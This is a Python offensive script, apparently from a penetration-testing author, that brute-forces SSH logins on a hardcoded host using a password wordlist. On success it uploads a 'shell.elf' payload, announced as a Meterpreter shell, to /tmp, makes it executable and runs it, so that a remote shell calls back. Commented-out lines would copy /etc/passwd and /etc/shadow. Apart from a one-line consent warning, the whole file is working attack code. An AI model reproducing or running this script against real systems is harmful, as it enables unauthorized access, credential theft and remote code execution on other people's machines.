#!/usr/bin/python3

print("""\                                                                                                                        
   _____  _____  _    _   ____                _          ______                          
  / ____|/ ____|| |  | | |  _ \              | |        |  ____|                          
 | (___ | (___  | |__| | | |_) | _ __  _   _ | |_  ___  | |__  ___   _ __  ___  ___  _ __ 
  \___ \ \___ \ |  __  | |  _ < | '__|| | | || __|/ _ \ |  __|/ _ \ | '__|/ __|/ _ \| '__|
  ____) |____) || |  | | | |_) || |   | |_| || |_|  __/ | |  | (_) || |  | (__|  __/| |   
 |_____/|_____/ |_|  |_| |____/ |_|    \__,_| \__|\___| |_|   \___/ |_|   \___|\___||_|   
 
 	                      **by assume-breach**
 	                      
 	               DO NOT USE WITHOUT NETWORK CONSENT
                                                                                          
                    """)

from pwn import *
import paramiko
import os
import time


host = "192.168.35.103"
username = "LinuxUser"
port_int = 22
attempts = 0
sshClient = paramiko.SSHClient()
client = paramiko.SSHClient()

with open("wordlist.txt", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try:
     print("[{}] Attempting Password: {}".format(attempts, password, port_int))
     response = ssh(host=host, user=username, password=password, port=port_int, timeout=1)
     if response.connected():
       print("[>] You Cracked It!: {}".format(password))
       sleep(2)
       print("***SENDING METERPRETER SHELL BACK***")
       response.close()
       break
    except paramiko.ssh_exception.AuthenticationException:
     print("[X] Nope, That's Not It")
    attempts += 1

try:
   client = paramiko.SSHClient()
   client.load_system_host_keys()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   client.connect(hostname=host, port=port_int, username=username, password=password)
   
   sftp = client.open_sftp()
   
# Download   
   
   #filepath = "/etc/passwd"
   #localpath = "/home/user/passwd.txt"
   #sftp.get(filepath,localpath)
   
   #filepath = "/etc/shadow"
   #localpath = "/home/user/shadow.txt"
   #sftp.get(filepath,localpath)

# Upload
   filepath = "/tmp/shell.elf"
   localpath = "shell.elf"
   sftp.put(localpath,filepath)

   sftp.close()

   while True:
   	try:  
   	   stdin, stdout, stderr = client.exec_command('chmod +x /tmp/shell.elf && cd /tmp && ./shell.elf')
   	   print(stdout.read().decode())
   	   break
   	except KeyboardInterupt:
   	    print("Exited On User Command")
   client.close()
except Exception as err:
   print(str(err))

